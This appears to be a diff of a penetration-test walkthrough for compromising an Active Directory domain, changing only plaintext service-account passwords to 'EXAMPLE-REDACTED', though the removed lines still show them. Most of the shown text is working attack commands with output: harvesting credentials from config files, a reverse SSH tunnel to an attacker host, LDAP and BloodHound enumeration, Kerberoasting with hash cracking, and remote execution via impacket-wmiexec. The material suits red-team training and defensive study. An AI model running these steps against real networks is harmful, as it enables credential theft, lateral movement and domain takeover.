@@ -144,7 +144,7 @@ net ads info -S EXAMPLE-CORP.LOCAL  # LDAP server: 10.10.10.10, Domain: EXAMPLE-
 grep -rn "password\|secret\|bind\|ldap" /etc/nginx/ /var/www/ /etc/sssd/ --include="*.conf" --include="*.php" --include="*.ini" 2>/dev/null
 # Found: /var/www/html/wp-config.php contains:
 # define('LDAP_BIND_DN', 'CN=svc_blog,CN=Users,DC=example-corp,DC=local');
-# define('LDAP_BIND_PASSWORD', 'B10g!S3rv1ce#2024');
+# define('LDAP_BIND_PASSWORD', 'EXAMPLE-REDACTED');
 ```
 
 **Key evidence**:
@@ -158,10 +158,10 @@ grep -rn "password\|secret\|bind\|ldap" /etc/nginx/ /var/www/ /etc/sssd/ --inclu
 
 # Option A: Reverse SSH tunnel (if SSH is installed on blog-web-01)
 ssh -R 4444:localhost:4444 user@attacker_ip  # from blog-web-01
-# Then from attacker: proxychains crackmapexec smb 10.10.10.10 -u svc_blog -p 'B10g!S3rv1ce#2024' --shares
+# Then from attacker: proxychains crackmapexec smb 10.10.10.10 -u svc_blog -p 'EXAMPLE-REDACTED' --shares
 
 # Option B: Run LDAP query directly from blog-web-01
-ldapsearch -H ldap://10.10.10.10 -D "CN=svc_blog,CN=Users,DC=example-corp,DC=local" -w 'B10g!S3rv1ce#2024' -b "DC=example-corp,DC=local" "(objectClass=user)" sAMAccountName memberOf
+ldapsearch -H ldap://10.10.10.10 -D "CN=svc_blog,CN=Users,DC=example-corp,DC=local" -w 'EXAMPLE-REDACTED' -b "DC=example-corp,DC=local" "(objectClass=user)" sAMAccountName memberOf
 ```
 
 **Result**: `svc_blog` is a standard domain user. Member of "Domain Users" and "Service Accounts" groups. No administrative privileges. NOT a Domain Admin.
@@ -179,7 +179,7 @@ ldapsearch -H ldap://10.10.10.10 -D "CN=svc_blog,CN=Users,DC=example-corp,DC=loc
 **Action**:
 ```bash
 # From attacker machine through tunnel:
-proxychains bloodhound-python -d EXAMPLE-CORP.LOCAL -u svc_blog -p 'B10g!S3rv1ce#2024' -dc 10.10.10.10 -c DCOnly -ns 10.10.10.10
+proxychains bloodhound-python -d EXAMPLE-CORP.LOCAL -u svc_blog -p 'EXAMPLE-REDACTED' -dc 10.10.10.10 -c DCOnly -ns 10.10.10.10
 ```
 
 **BloodHound analysis**:
@@ -200,25 +200,25 @@ proxychains bloodhound-python -d EXAMPLE-CORP.LOCAL -u svc_blog -p 'B10g!S3rv1ce
 ## Phase 6: Kerberoasting the Service Account
 
 ```bash
-proxychains impacket-GetUserSPNs EXAMPLE-CORP.LOCAL/svc_blog:'B10g!S3rv1ce#2024' -request -outputfile kerb_hashes.txt
+proxychains impacket-GetUserSPNs EXAMPLE-CORP.LOCAL/svc_blog:'EXAMPLE-REDACTED' -request -outputfile kerb_hashes.txt
 # Returns: TGS for svc_sql (MSSQLSvc/sql-01.EXAMPLE-CORP.LOCAL)
 ```
 
 **Crack**:
 ```bash
 hashcat -m 13100 kerb_hashes.txt /path/to/wordlist --force
-# Cracked: SqlS3rv!ce#2023!
+# Cracked: EXAMPLE-REDACTED
 ```
 
 **Key evidence**:
-- [FACT] svc_sql password: SqlS3rv!ce#2023!
+- [FACT] svc_sql password: EXAMPLE-REDACTED
 - [UNKNOWN] Is svc_sql a local admin on sql-01? (Common for SQL Server service accounts)
 
 **Validate**:
 ```bash
-proxychains crackmapexec smb 10.10.2.50 -u svc_sql -p 'SqlS3rv!ce#2023!'
+proxychains crackmapexec smb 10.10.2.50 -u svc_sql -p 'EXAMPLE-REDACTED'
 # SMB 10.10.2.50 445 SQL-01 [*] Windows 10.0 Build 17763 (domain:EXAMPLE-CORP.LOCAL)
-# SMB 10.10.2.50 445 SQL-01 [+] EXAMPLE-CORP.LOCAL\svc_sql:SqlS3rv!ce#2023! (Pwn3d!)
+# SMB 10.10.2.50 445 SQL-01 [+] EXAMPLE-CORP.LOCAL\svc_sql:EXAMPLE-REDACTED (Pwn3d!)
 # "Pwn3d!" means: local admin on sql-01
 ```
 
@@ -233,7 +233,7 @@ proxychains crackmapexec smb 10.10.2.50 -u svc_sql -p 'SqlS3rv!ce#2023!'
 **Decision**: We have local admin on sql-01. Move there and recollect. A SQL Server in a corporate environment often has privileged sessions or credentials.
 
 ```bash
-proxychains impacket-wmiexec EXAMPLE-CORP.LOCAL/svc_sql:'SqlS3rv!ce#2023!'@10.10.2.50
+proxychains impacket-wmiexec EXAMPLE-CORP.LOCAL/svc_sql:'EXAMPLE-REDACTED'@10.10.2.50
 ```
 
 **On sql-01**:
